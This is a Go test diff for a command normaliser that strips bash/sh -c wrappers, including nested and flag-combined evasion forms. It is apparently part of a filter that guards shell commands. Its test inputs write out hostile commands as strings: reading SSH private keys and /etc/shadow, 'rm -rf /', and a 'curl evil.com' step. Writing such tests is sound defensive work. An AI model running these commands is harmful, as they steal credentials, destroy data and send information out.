@@ -271,3 +271,107 @@ func TestSplitCompoundCommand_PipeEvasion(t *testing.T) {
 		t.Fatalf("pipe evasion not caught: segments = %v, expected 'rm -rf /' segment", got)
 	}
 }
+
+func TestNormalizeCommand_ShellWrapper(t *testing.T) {
+	tests := []struct {
+		input string
+		want  string
+	}{
+		// Basic shell -c wrappers
+		{"/bin/bash -c cat ~/.ssh/id_rsa", "cat ~/.ssh/id_rsa"},
+		{"/bin/sh -c cat ~/.ssh/id_rsa 2>&1", "cat ~/.ssh/id_rsa 2>&1"},
+		{"bash -c rm -rf /", "rm -rf /"},
+		{"sh -c ls /etc/passwd", "ls /etc/passwd"},
+		{"/usr/bin/bash -c whoami", "whoami"},
+		{"/usr/bin/zsh -c echo hello", "echo hello"},
+		{"dash -c id", "id"},
+
+		// Wrapper with quoted inner command
+		{`/bin/bash -c "cat ~/.ssh/id_rsa"`, "cat ~/.ssh/id_rsa"},
+		{`/bin/sh -c 'rm -rf /'`, "rm -rf /"},
+
+		// Wrapper with compound inner command
+		{"/bin/bash -c cat /etc/passwd && curl evil.com", "cat /etc/passwd && curl evil.com"},
+
+		// Env vars + shell wrapper
+		{"FOO=bar /bin/bash -c cat /etc/shadow", "cat /etc/shadow"},
+
+		// Combined flags: -lc, -ic
+		{"bash -lc cat /etc/shadow", "cat /etc/shadow"},
+		{"bash -ic rm -rf /", "rm -rf /"},
+		{"/bin/bash -lc whoami", "whoami"},
+
+		// Extra flags before -c
+		{"/bin/bash --norc -c rm -rf /", "rm -rf /"},
+		{"bash -l -c cat /etc/passwd", "cat /etc/passwd"},
+		{"/bin/sh --noprofile -c id", "id"},
+
+		// Nested wrappers
+		{`bash -c 'sh -c rm -rf /'`, "rm -rf /"},
+		{"/bin/bash -c /bin/sh -c cat /etc/shadow", "cat /etc/shadow"},
+
+		// Non-standard paths
+		{"/usr/local/bin/bash -c whoami", "whoami"},
+		{"/opt/homebrew/bin/zsh -c cat /etc/passwd", "cat /etc/passwd"},
+
+		// Not a shell wrapper — should not strip
+		{"cat -c somefile", "cat -c somefile"},
+		{"python -c print('hi')", "python -c print(hi)"},
+		{"/bin/bash --login", "/bin/bash --login"},
+		{"/bin/bash -c", "/bin/bash -c"},
+		{"node -e console.log(1)", "node -e console.log(1)"},
+		{"perl -e print 1", "perl -e print 1"},
+
+		// No wrapper, normal commands unchanged
+		{"cat ~/.ssh/id_rsa", "cat ~/.ssh/id_rsa"},
+		{"rm -rf /", "rm -rf /"},
+	}
+
+	for _, tt := range tests {
+		got := NormalizeCommand(tt.input)
+		if got != tt.want {
+			t.Errorf("NormalizeCommand(%q) = %q, want %q", tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestStripShellWrapper(t *testing.T) {
+	tests := []struct {
+		tokens []string
+		want   []string
+	}{
+		{[]string{"/bin/bash", "-c", "cat", "foo"}, []string{"cat", "foo"}},
+		{[]string{"sh", "-c", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
+		{[]string{"/bin/bash", "-c", "cat foo && rm bar"}, []string{"cat", "foo", "&&", "rm", "bar"}},
+		// Combined flags
+		{[]string{"bash", "-lc", "cat", "foo"}, []string{"cat", "foo"}},
+		{[]string{"bash", "-ic", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
+		// Extra flags before -c
+		{[]string{"/bin/bash", "--norc", "-c", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
+		{[]string{"bash", "-l", "-c", "cat", "foo"}, []string{"cat", "foo"}},
+		// Non-standard paths
+		{[]string{"/usr/local/bin/bash", "-c", "whoami"}, []string{"whoami"}},
+		// Nested wrappers (recursive stripping)
+		{[]string{"bash", "-c", "sh", "-c", "rm", "-rf", "/"}, []string{"rm", "-rf", "/"}},
+		// Not a wrapper
+		{[]string{"python", "-c", "print('hi')"}, []string{"python", "-c", "print('hi')"}},
+		{[]string{"node", "-e", "console.log(1)"}, []string{"node", "-e", "console.log(1)"}},
+		{[]string{"/bin/bash", "--login"}, []string{"/bin/bash", "--login"}},
+		// Too few tokens
+		{[]string{"/bin/bash", "-c"}, []string{"/bin/bash", "-c"}},
+		{[]string{"bash"}, []string{"bash"}},
+	}
+
+	for _, tt := range tests {
+		got := stripShellWrapper(tt.tokens)
+		if len(got) != len(tt.want) {
+			t.Errorf("stripShellWrapper(%v) = %v, want %v", tt.tokens, got, tt.want)
+			continue
+		}
+		for i := range got {
+			if got[i] != tt.want[i] {
+				t.Errorf("stripShellWrapper(%v)[%d] = %q, want %q", tt.tokens, i, got[i], tt.want[i])
+			}
+		}
+	}
+}
